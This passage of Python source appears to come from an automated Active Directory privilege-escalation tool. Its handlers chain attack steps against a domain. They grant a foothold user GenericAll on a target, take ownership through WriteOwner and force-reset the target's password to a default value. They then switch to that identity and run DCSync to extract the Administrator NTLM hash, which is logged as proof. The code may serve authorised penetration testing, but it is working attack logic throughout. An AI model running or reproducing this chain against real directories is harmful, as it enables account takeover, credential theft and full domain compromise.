                self._audit_event("privesc.context.switch.failed", "error", context_failure_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": context_failure_message, "action_message": success_messages["action_message"], "result_message": context_failure_message, "context_message": None}

            context_success_message = success_messages["context_message"]
            self._audit_event("privesc.context.switch.success", "info", context_success_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=target_identity, ldap_user=getattr(self.actions.conn, "user", None))
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": success_messages["result_message"], "action_message": success_messages["action_message"], "result_message": success_messages["result_message"], "context_message": context_success_message, "proof_value": self.default_reset_password}

        if action == "grant_genericall_switch_context_then_reset_password":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Owns on user requires a resolvable target DN and SID."}

            foothold_user = current_auth.get("username") or "the foothold user"
            target_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            grant_action_message = f"Granting GenericAll on {target_name} to {foothold_user}"
            self._audit_event("privesc.genericall.grant.started", "info", grant_action_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                failure_message = f"Failed to grant GenericAll on {target_name}."
                self._audit_event(
                    "privesc.genericall.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="GenericAll",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_grant_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_grant_diagnostic", None),
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": grant_action_message, "grant_result_message": None, "add_action_message": None, "result_message": failure_message, "context_message": None}

            grant_result_message = f"Successfully granted GenericAll on {target_name} to {foothold_user}."
            self._audit_event("privesc.genericall.grant.success", "info", grant_result_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            password_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=True)
            self._audit_event("privesc.force_change_password.started", "info", password_messages["action_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _safe_call("force_change_password", self.actions.force_change_password, target_dn, self.default_reset_password):
                failure_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=False)
                self._audit_event("privesc.force_change_password.failed", "error", failure_messages["result_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_messages["result_message"], "action_message": grant_action_message, "grant_result_message": grant_result_message, "add_action_message": None, "password_action_message": failure_messages["action_message"], "result_message": failure_messages["result_message"], "context_message": None}

            success_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=True)
            self._audit_event("privesc.force_change_password.success", "info", success_messages["result_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            self.context.add_credential(target_identity, "password", self.default_reset_password)
            if not _switch_identity_after_reset(self.actions, self.context, item["end_node"], target_dn):
                context_failure_message = f"Password reset succeeded, but failed to change context to user {target_identity}."
                self._audit_event("privesc.context.switch.failed", "error", context_failure_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": context_failure_message, "action_message": grant_action_message, "grant_result_message": grant_result_message, "add_action_message": None, "password_action_message": success_messages["action_message"], "result_message": context_failure_message, "context_message": None}

            context_success_message = success_messages["context_message"]
            self._audit_event("privesc.context.switch.success", "info", context_success_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=target_identity, ldap_user=getattr(self.actions.conn, "user", None))

            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": success_messages["result_message"], "action_message": grant_action_message, "grant_result_message": grant_result_message, "add_action_message": None, "password_action_message": success_messages["action_message"], "result_message": success_messages["result_message"], "context_message": context_success_message, "proof_value": self.default_reset_password}

        if action == "take_ownership_grant_genericall_then_reset_password":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "User ownership chain requires a resolvable target DN and SID."}

            foothold_user = current_auth.get("username") or "the foothold user"
            target_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name

            owner_action_message = f"Making {foothold_user} the owner of {target_name}"
            self._audit_event("privesc.owner.takeover.started", "info", owner_action_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _safe_call("set_owner", self.actions.set_owner, target_dn, current_sid):
                owner_failure_message = f"Failed to make {foothold_user} the owner of {target_name}."
                self._audit_event(
                    "privesc.owner.takeover.failed",
                    "error",
                    owner_failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteOwner",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_owner_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_owner_diagnostic", None),
                    owner_status=getattr(self.actions, "last_owner_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": owner_failure_message, "action_message": owner_action_message, "grant_result_message": None, "add_action_message": None, "password_action_message": None, "result_message": owner_failure_message, "context_message": None}

            owner_success_message = f"Successfully made {foothold_user} the owner of {target_name}."
            self._audit_event("privesc.owner.takeover.success", "info", owner_success_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _refresh_bind(self.actions, self.context):
                failure_message = "Rebind failed after ownership takeover."
                self._audit_event("privesc.owner.takeover.failed", "error", failure_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": None, "password_action_message": None, "result_message": failure_message, "context_message": None}

            grant_action_message = f"Granting GenericAll on {target_name} to {foothold_user}"
            self._audit_event("privesc.genericall.grant.started", "info", grant_action_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                failure_message = f"Failed to grant GenericAll after ownership takeover on {target_name}."
                self._audit_event("privesc.genericall.grant.failed", "error", failure_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions, "last_grant_result", None) or getattr(self.actions.conn, "result", {}), diagnostic=getattr(self.actions, "last_grant_diagnostic", None), grant_status=getattr(self.actions, "last_grant_status", None))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "password_action_message": None, "result_message": failure_message, "context_message": None}

            genericall_success_message = f"Successfully granted GenericAll on {target_name} to {foothold_user}."
            self._audit_event("privesc.genericall.grant.success", "info", genericall_success_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _refresh_bind(self.actions, self.context):
                failure_message = "Rebind failed after the GenericAll grant."
                self._audit_event("privesc.genericall.grant.failed", "error", failure_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}), diagnostic="Grant succeeded but LDAP rebind failed.")
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "password_action_message": None, "result_message": failure_message, "context_message": None}

            password_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=True)
            self._audit_event("privesc.force_change_password.started", "info", password_messages["action_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            success = _safe_call("force_change_password", self.actions.force_change_password, target_dn, self.default_reset_password)
            if not success:
                failure_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=False)
                self._audit_event("privesc.force_change_password.failed", "error", failure_messages["result_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_messages["result_message"], "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "password_action_message": failure_messages["action_message"], "result_message": failure_messages["result_message"], "context_message": None}

            success_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=True)
            self._audit_event("privesc.force_change_password.success", "info", success_messages["result_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            self.context.add_credential(target_identity, "password", self.default_reset_password)
            if not _switch_identity_after_reset(self.actions, self.context, item["end_node"], target_dn):
                context_failure_message = f"Password reset succeeded, but failed to change context to user {target_identity}."
                self._audit_event("privesc.context.switch.failed", "error", context_failure_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": context_failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "password_action_message": success_messages["action_message"], "result_message": context_failure_message, "context_message": None}

            context_success_message = success_messages["context_message"]
            self._audit_event("privesc.context.switch.success", "info", context_success_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=target_identity, ldap_user=getattr(self.actions.conn, "user", None))

            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": success_messages["result_message"], "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "password_action_message": success_messages["action_message"], "result_message": success_messages["result_message"], "context_message": context_success_message, "proof_value": self.default_reset_password}

        if action == "take_ownership_grant_genericall_then_dcsync":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Domain ownership chain requires a resolvable target DN and SID."}

            foothold_user = current_auth.get("username") or "the foothold user"

            owner_action_message = f"Making {foothold_user} the owner of {target_name}"
            self._audit_event("privesc.owner.takeover.started", "info", owner_action_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _safe_call("set_owner", self.actions.set_owner, target_dn, current_sid):
                owner_failure_message = f"Failed to make {foothold_user} the owner of {target_name}."
                self._audit_event(
                    "privesc.owner.takeover.failed",
                    "error",
                    owner_failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteOwner",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_owner_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_owner_diagnostic", None),
                    owner_status=getattr(self.actions, "last_owner_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": owner_failure_message, "action_message": owner_action_message, "grant_result_message": None, "add_action_message": None, "password_action_message": None, "result_message": owner_failure_message, "context_message": None}

            owner_success_message = f"Successfully made {foothold_user} the owner of {target_name}."
            self._audit_event("privesc.owner.takeover.success", "info", owner_success_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _refresh_bind(self.actions, self.context):
                failure_message = "Rebind failed after ownership takeover."
                self._audit_event("privesc.owner.takeover.failed", "error", failure_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": None, "password_action_message": None, "result_message": failure_message, "context_message": None}

            grant_action_message = f"Granting GenericAll on {target_name} to {foothold_user}"
            self._audit_event("privesc.genericall.grant.started", "info", grant_action_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                failure_message = f"Failed to grant GenericAll on {target_name}."
                self._audit_event(
                    "privesc.genericall.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="GenericAll",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_grant_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_grant_diagnostic", None),
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "password_action_message": None, "result_message": failure_message, "context_message": None}

            genericall_success_message = f"Successfully granted GenericAll on {target_name} to {foothold_user}."
            self._audit_event("privesc.genericall.grant.success", "info", genericall_success_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not self.context.switch_identity(foothold_user) or not _refresh_bind(self.actions, self.context):
                context_failure_message = f"Failed to switch context to user {foothold_user}."
                self._audit_event("privesc.context.switch.failed", "error", context_failure_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": context_failure_message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {genericall_success_message}", "add_action_message": grant_action_message, "password_action_message": None, "result_message": context_failure_message, "context_message": None}

            context_success_message = f"Context changed to user {foothold_user} successfully."
            self._audit_event("privesc.context.switch.success", "info", context_success_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            dcsync_action_message = f"Performing DCSync against {target_name}"
            self._audit_event("privesc.dcsync.started", "info", dcsync_action_message, target_name, target_dn=target_dn, action="DCSync", current_identity=foothold_user, current_username=foothold_user)

            dcsync_auth = self.context.get_current_auth()
            dcsync_password = dcsync_auth.get("value")
            if not dcsync_password:
                failure_message = "DCSync requires active credentials after context switch."
                self._audit_event("privesc.dcsync.failed", "error", failure_message, target_name, target_dn=target_dn, action="DCSync", current_identity=foothold_user, current_username=foothold_user)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {genericall_success_message}", "add_action_message": grant_action_message, "password_action_message": dcsync_action_message, "result_message": failure_message, "context_message": context_success_message}

            success = _safe_call("dcsync", self.actions.dcsync, dcsync_password)
            hash_value = success if isinstance(success, str) else getattr(self.actions, "last_dcsync_hash", None)
            success_bool = bool(success)
            message = "DCSync completed and the domain credentials have been harvested." if success_bool else "DCSync failed after the ownership takeover chain."

            if not success_bool:
                self._audit_event("privesc.dcsync.failed", "error", message, target_name, target_dn=target_dn, action="DCSync", current_identity=foothold_user, current_username=foothold_user)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {genericall_success_message}", "add_action_message": grant_action_message, "password_action_message": dcsync_action_message, "result_message": message, "context_message": context_success_message, "proof_value": hash_value}

            if success_bool and self._is_last_step(item):
                completion_message = self._completion_context_message("domain", target_name, hash_value or "")
                self._audit_event("privesc.context.completed", "info", completion_message, target_name, target_dn=target_dn, action="ContextComplete")
                self._audit_event("privesc.dcsync.success", "info", f"Administrator NTLM hash extracted: {hash_value}", target_name, target_dn=target_dn, action="DCSync", proof_value=hash_value, current_identity=foothold_user, current_username=foothold_user)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": completion_message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {genericall_success_message}", "add_action_message": grant_action_message, "password_action_message": dcsync_action_message, "result_message": f"Administrator NTLM hash extracted: {hash_value}", "context_message": context_success_message, "proof_value": hash_value}

            self._audit_event("privesc.dcsync.success", "info", message, target_name, target_dn=target_dn, action="DCSync", proof_value=hash_value, current_identity=foothold_user, current_username=foothold_user)
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {genericall_success_message}", "add_action_message": grant_action_message, "password_action_message": dcsync_action_message, "result_message": message, "context_message": context_success_message, "proof_value": hash_value}

        return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Unhandled strict action: {action}"}
